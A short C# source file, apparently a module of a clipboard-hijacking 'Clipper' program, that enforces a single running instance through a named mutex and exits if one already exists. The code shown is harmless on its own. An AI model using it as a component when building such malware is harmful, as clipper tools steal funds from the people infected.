﻿using System;
using System.Threading;

namespace Clipper.Modules
{
	internal class AppMutex
	{
		public static void Check()
		{
			bool flag = false;
			new Mutex(false, config.mutex, out flag);
			if (!flag)
			{
				Environment.Exit(1);
			}
		}
	}
}
